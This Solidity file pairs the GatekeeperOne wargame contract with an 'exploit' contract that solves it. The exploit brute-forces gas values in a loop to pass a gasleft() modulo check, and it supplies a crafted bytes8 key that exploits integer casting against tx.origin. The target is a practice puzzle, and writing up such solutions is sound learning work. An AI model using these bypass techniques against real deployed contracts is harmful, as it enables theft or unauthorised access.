// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract exploit{
  address addr =0x71cCD2Ccd49b8302c86b7Fb279E373cc90FdCddE;

  function callgate() public {
    for (uint i = 0; i < 8191; i++){
      uint totalgas = 8191 * 10 + i;
    (bool success,) = addr.call{gas : totalgas}(abi.encodeWithSignature("enter(bytes8)", bytes8(0x100000000000867E)));
    if(success){
      break;
    }
    }
    
  }
}

// 0x000000000000867e